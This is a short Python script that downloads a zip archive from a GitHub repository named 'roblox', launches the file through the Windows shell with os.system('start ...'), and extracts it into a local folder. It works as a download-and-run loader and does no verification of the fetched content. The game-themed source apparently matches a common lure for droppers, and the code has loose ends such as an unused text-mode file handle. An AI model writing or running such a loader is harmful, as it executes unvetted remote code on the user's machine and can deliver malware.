from urllib import request
import os
import subprocess
import time
# Define the remote file to retrieve
remote_url = 'https://github.com/bj0rntje/roblox/raw/main/unpackaged.zip'
# Define the local filename to save data
local_file = 'packaged.zip'
# Download remote and save locally
request.urlretrieve(remote_url, local_file)
f = open("packaged.zip", "r")
commanding = "start "+local_file
os.system(commanding)
#subprocess.call(commanding)



import zipfile
with zipfile.ZipFile("packaged.zip","r") as zip_ref:
    zip_ref.extractall("targetdir")
